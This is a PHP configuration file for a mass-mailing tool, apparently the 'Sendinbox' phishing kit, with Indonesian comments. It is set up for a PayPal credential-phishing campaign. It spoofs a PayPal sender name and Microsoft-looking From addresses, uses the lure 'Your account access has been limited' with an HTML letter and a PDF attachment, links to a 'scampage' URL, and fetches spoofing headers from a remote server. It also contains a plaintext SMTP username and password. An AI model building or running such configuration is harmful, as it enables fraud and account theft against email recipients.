<?php

require_once 'autoload.php';
class Config
{
	function CustomHeader($email = "admin@bmarket.or.id"){
		$this->modules 	= new SendinboxModules;
		$randomtext 	= $this->modules->random_text('textnumrandom' , 40 , 'low');
		$stk  			= $this->modules->stuck("[ Custom Header Bmarket ? (1 = BmarketCustom , 2 = MyCustom)] : ");

		if( $stk == 1){

			$x = file_get_contents("https://vip.bmarket.or.id/header%20(tools).php");
			$x = json_decode($x,true);

			$listHeader = array('Yahoo','Hotmail');
			print_r($listHeader);
			$stkx  = $this->modules->stuck("[ Select Number ] : ");

			foreach ($x[$listHeader[$stkx]] as $key => $value) {
				foreach ($value as $keyH => $valueH) {
					$arrayDefault[] = array($keyH => $this->modules->check_random($valueH , 'up') );
				}
			}
		}

		if( $stk == 2){
			$arrayDefault[] = array(
				//'List-Unsubscribe' => 'mailto:bounce-11@mail.paypal.com?subject=list-unsubscrib',
				//'List-Unsubscribe' => 'mailto:bounce-'.$randomtext.'@mail.paypal.com?subject=list-unsubscrib',
				//'List-Unsubscribe' => 'mailto:bounce-'.$randomtext.'@mail.paypal.com?subject=list-unsubscrib',
			);
		}

		return $arrayDefault;
	}

	function setting(){
		// anti bounce = fitur untuk memfilter email dengan akurat 90-95% sehingga email yang tak terdaftar di server mail tidak akan di kirim. (ini menghemat limit relay mu)
		return array(
			'anti_bounce' 			=> false, 								// true = hidupkan / false = matikan
			// format array('kata1','kata2','kata3'),
			'encrypt_kata' 			=> array('',), 							// options
			'scampage_link' 		=> array('https://service.mylogisoft.com'),							// options
			'number' 				=> 1,  									// jumlah email yang di kirim
			'delay'  				=> 10, 									// delay setelah mengirim email yang di kirim
		);
	}

	function smtp()
	{
		/*	----------------------------------------------------------------
			- HARAP DI PERHATIKAN SAAT KONFIGURASI KARENA SENSIF.
			- ISILAH DATA DI DALAM KUTIP ATAU GANTI ... DENGAN DATA MU
			- Kesalahan Smtp Connect() karena kurang teliti atau memang smtp itu mati.
			----------------------------------------------------------------

			------------------ [ TRICK INBOX]------------------------------
			Hotmail From Email : {textnumrandom,40,1}@{textnumrandom,40,2}.account.live.mail.com

		*/

		return array(

			/*------------- Konfigurasi SMTP -------------*/
			array(
				'smtp_user' 	=>  'calm@racismtent.org',
				'smtp_pass' 	=>  'AmiGans32!',
				'smtp_host' 	=>  'smtp-relay.gmail.com',
				'smtp_port' 	=>  '587', // 587 atau 465 [587 = tls | 465 = ssl]
				'smtp_secure' 	=>  'tls', // tls atau ssl
				'recipients' 	=> array(
					'from_name'  => "service@intl.paypal.com",
					'from_email' => '{textnumrandom,40,1}@{textnumrandom,40,2}.account.live.mail.com',
				),
				'content' 	=> array(
					'format' => array(
						'Your account access has been limited' => 'ppyahoo.html',  // hapus line ini bila tidak digunakan
					),
					'attachments'=> array(
						'bayar.pdf', // masukan file attachments di folder attachments , jika tidak di perlukan silahkan rubah namanya menjadi test.pdf
						//'test.html', //  auto convert html to pdf
					),
				),
				'convert_to_pdf' => true, // ini untuk letter html menjadi pdf
			),
			/*--------------------------------------------*/
		);
	}
}
